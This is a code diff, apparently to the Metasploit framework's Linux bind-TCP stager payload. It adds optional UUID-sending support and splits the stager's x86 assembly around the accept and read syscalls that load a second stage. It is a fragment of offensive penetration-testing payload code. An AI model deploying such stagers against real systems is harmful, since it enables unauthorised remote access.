@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/linux/send_uuid'
 
 module Msf
 
@@ -17,6 +18,7 @@ module Payload::Linux::BindTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
+  include Msf::Payload::Linux::SendUUID
 
   #
   # Generate the first stage
@@ -34,6 +36,14 @@ module Payload::Linux::BindTcp
     end
 
     generate_bind_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
   end
 
   #
@@ -133,6 +143,11 @@ module Payload::Linux::BindTcp
         mov [ecx+0x4],edx
         int 0x80                      ; invoke socketcall (SYS_ACCEPT)
         xchg eax,ebx
+    ^
+
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
         mov dh,0xc                    ; at least 0x0c00 bytes
         mov al,0x3                    ; read syscall
         int 0x80                      ; invoke read
